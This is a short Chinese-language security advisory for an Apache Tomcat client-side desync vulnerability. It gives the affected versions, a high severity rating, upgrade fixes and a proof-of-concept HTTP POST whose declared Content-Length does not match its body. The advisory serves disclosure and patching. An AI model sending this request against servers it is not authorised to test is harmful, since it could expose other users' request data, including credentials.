# 漏洞描述

Apache Tomcat 不完整的 POST 请求触发了错误响应，该响应可能包含来自其他用户的先前请求的数据。

当 Web 服务器无法正确处理 POST 请求的内容长度时，就会出现客户端不同步 (CSD) 漏洞。通过利用此行为，攻击者可以强制受害者的浏览器取消与网站的连接同步，从而导致敏感数据从服务器和/或客户端连接中走私。

在某些情况下，这可能会泄露敏感数据，例如明文凭据

# 受影响的版本

Apache Tomcat 9.0.0-M11 至 9.0.43

Apache Tomcat 8.5.7 至 8.5.63

# 严重性

高危

# 影响

攻击者可以强制受害者的浏览器取消与网站的连接同步，从而导致敏感数据从服务器或客户端连接中走私。

# POC

```yaml
POST / HTTP/1.1
Host: hostname
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 6
Content-Type: application/x-www-form-urlencoded

X
```

# 修复建议

受影响版本的用户应应用以下缓解措施之一：

- 升级到 Apache Tomcat 9.0.44 或更高版本
- 升级到 Apache Tomcat 8.5.64 或更高版本